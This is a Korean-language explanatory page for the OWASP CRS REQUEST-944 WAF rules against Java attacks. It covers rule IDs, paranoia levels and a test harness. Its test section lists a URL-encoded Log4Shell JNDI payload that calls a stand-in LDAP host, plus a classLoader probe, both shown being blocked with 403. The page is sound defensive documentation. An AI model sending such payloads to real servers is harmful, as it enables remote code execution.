# REQUEST-944-APPLICATION-ATTACK-JAVA.conf — 쉽게 읽는 분석

> 이 문서는 `REQUEST-944-APPLICATION-ATTACK-JAVA.conf` 룰을 "기초 → 룰 → 공격 예제 → 검증" 순서로 쉽게 설명한다.

분석 대상: `install/nginx/conf/crs/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf` (CRS 4.30.0-dev)

---

## 0. 먼저 알아두면 좋은 ModSecurity 기초

- **룰**은 변수(예: `ARGS`, `REQUEST_URI`, `REQUEST_HEADERS`, `REQUEST_FILENAME`)를 연산자로 검사하고 action 을 정한다.
- **phase**: 1=요청 헤더, 2=요청 본문/파라미터, 3/4=응답, 5=로깅.
- **어노말리 스코어**: 룰은 점수만 쌓고, phase 2 끝(또는 phase 4 끝)에 `949110`/`959110` 이 임계값을 넘으면 차단.
- **paranoia level(PL)**: 1~4. 구간 사이 게이팅 룰(`…011`~`…018`)이 있다.

> 실행 모델: [../../modsecurity/execution-model.md](../../modsecurity/execution-model.md)

---

## 1. 한 줄 요약

> Java(LDAP/Log4Shell 등) 공격을 탐지한다.

## 2. 룰

> 상세 설명은 룰 id별 `<id>.md` 파일에 있다.

| ID | phase | PL | severity | 메시지 |
|----|-------|----|----------|--------|
| [944011](../../modsecurity/paranoia-gating.md) | 1 | - | - | (게이팅) PL 구간 제어 |
| [944012](../../modsecurity/paranoia-gating.md) | 2 | - | - | (게이팅) PL 구간 제어 |
| [944100](944100.md) | 2 | 1 | CRITICAL | Remote Command Execution: Suspicious Java class detected |
| [944110](944110.md) | 2 | 1 | CRITICAL | Remote Command Execution: Java process spawn (CVE-2017-9805) |
| [944120](944120.md) | 2 | 1 | CRITICAL | Remote Command Execution: Java serialization (CVE-2015-4852) |
| [944130](944130.md) | 2 | 1 | CRITICAL | Suspicious Java class detected |
| [944140](944140.md) | 2 | 1 | CRITICAL | Java Injection Attack: Java Script File Upload Found |
| [944150](944150.md) | 2 | 1 | CRITICAL | Potential Remote Command Execution: Log4j / Log4shell |
| [944013](../../modsecurity/paranoia-gating.md) | 1 | - | - | (게이팅) PL 구간 제어 |
| [944014](../../modsecurity/paranoia-gating.md) | 2 | - | - | (게이팅) PL 구간 제어 |
| [944151](944151.md) | 2 | 2 | CRITICAL | Potential Remote Command Execution: Log4j / Log4shell |
| [944200](944200.md) | 2 | 2 | CRITICAL | Magic bytes Detected, probable java serialization in use |
| [944210](944210.md) | 2 | 2 | CRITICAL | Magic bytes Detected Base64 Encoded, probable java serialization in use |
| [944240](944240.md) | 2 | 2 | CRITICAL | Remote Command Execution: Java serialization (CVE-2015-4852) |
| [944250](944250.md) | 2 | 2 | CRITICAL | Remote Command Execution: Suspicious Java method detected |
| [944260](944260.md) | 2 | 2 | CRITICAL | Remote Command Execution: Malicious class-loading payload |
| [944015](../../modsecurity/paranoia-gating.md) | 1 | - | - | (게이팅) PL 구간 제어 |
| [944016](../../modsecurity/paranoia-gating.md) | 2 | - | - | (게이팅) PL 구간 제어 |
| [944300](944300.md) | 2 | 3 | CRITICAL | Base64 encoded string matched suspicious keyword |
| [944017](../../modsecurity/paranoia-gating.md) | 1 | - | - | (게이팅) PL 구간 제어 |
| [944018](../../modsecurity/paranoia-gating.md) | 2 | - | - | (게이팅) PL 구간 제어 |
| [944152](944152.md) | 2 | 4 | CRITICAL | Potential Remote Command Execution: Log4j / Log4shell |

---

## 3. 공격 예제 및 실측

| ID | 공격 예제(요청) | HTTP |
|----|------------------|------|
| [944150](944150.md) | `/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D` | **403** |
| [944151](944151.md) | `/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D` | **403** |
| [944152](944152.md) | `/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D` | **403** |
| [944130](944130.md) | `/?x=class.module.classLoader` | **403** |

> 그 외 룰은 nginx 도달 불가/조건 필요라 `tests/<id>.sh` 에서 SKIP 처리했다. (PL 게이팅 룰은 테스트에서 제외)

---

## 4. 흐름 / 관계

- 매칭된 룰이 점수를 누적하고, 실제 차단은 **`949110`(요청)/`959110`(응답)** 이 수행한다.
- 파일은 PL 구간으로 나뉘고, 구간 사이 게이팅 룰이 낮은 PL 에서 하위 구간을 건너뛴다.

---

## 5. 검증 (테스트 하네스)

```
tests/
├── lib.sh · verify.sh · run-all.sh   # 범용 하네스
├── cases.tsv                         # 룰 id별 공격 예제
├── <rule-id>.sh                      # 룰 id별 개별 실행
└── (로그: ../../../logs/local_test/<파일명>/)
```

```bash
cd rules/REQUEST-944-APPLICATION-ATTACK-JAVA/tests
./run-all.sh      # 전체
./<rule-id>.sh   # 개별
```

로그: `logs/local_test/REQUEST-944-APPLICATION-ATTACK-JAVA/`

---

## 6. 참고

- 실행 모델: [../../modsecurity/execution-model.md](../../modsecurity/execution-model.md)
- 생성 도구: `tools/gen_rule_docs.py`, `tools/make_harness.sh`
- 룰 원본: `coreruleset/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf`
